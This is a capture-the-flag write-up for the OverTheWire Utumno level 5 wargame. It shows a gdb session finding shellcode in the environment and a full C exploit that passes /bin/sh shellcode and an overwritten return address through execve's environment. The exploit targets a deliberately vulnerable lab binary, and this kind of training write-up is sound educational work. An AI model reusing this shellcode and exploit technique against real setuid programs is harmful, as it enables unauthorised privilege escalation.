# Overthewire Utumno Level 5 Writeup

This one resembles level 2. I just needed to figure out the right start address of `env`. 

```bash
...strip...
(gdb) x/s *((char **)environ)
0xffffdfb1:0xffffdfb1"1\300Ph//shh/bin\211\343PS\211\341\211\302\260\v\315\200" # shellcode in env
```

Use `catch exec` to make gdb pause when the new process spawns. Set a breakpoint after it initialized the new `env`s.

The final exploit:

```c
#include <unistd.h>

int main(){
        char *env[11];
        env[0]="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80";
        env[1]=env[2]=env[3]=env[4]=env[5]=env[6]=env[7]=env[8]="";
        env[9]="Aa0Aa1Aa2Aa3Aa4A\xb1\xdf\xff\xff";
        env[10]=NULL;
        execve("/utumno/utumno5",NULL,env);
}
```
